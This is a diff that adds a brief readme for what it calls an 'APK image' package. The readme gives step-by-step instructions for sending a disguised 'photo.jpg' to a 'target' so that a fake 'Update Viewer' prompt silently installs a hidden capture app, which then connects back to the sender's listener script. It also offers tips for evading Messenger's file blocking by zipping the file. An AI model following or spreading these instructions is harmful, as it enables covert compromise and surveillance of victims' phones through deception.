@@ -1,0 +1,12 @@
+APK IMAGE FINAL PACKAGE
+
+1. Send the 'photo.jpg' file to the target (Telegram, SD card, etc).
+2. When the target opens it, they will see a fake 'Update Viewer' request.
+3. If accepted, the hidden app (capture.apk) installs silently.
+4. Your listener (python listener.py) must be running to catch the connection.
+
+NOTES:
+- NEVER send directly over Messenger (it blocks APK files).
+- Best method: compress photo.jpg inside a ZIP before sending if needed.
+
+Good luck!
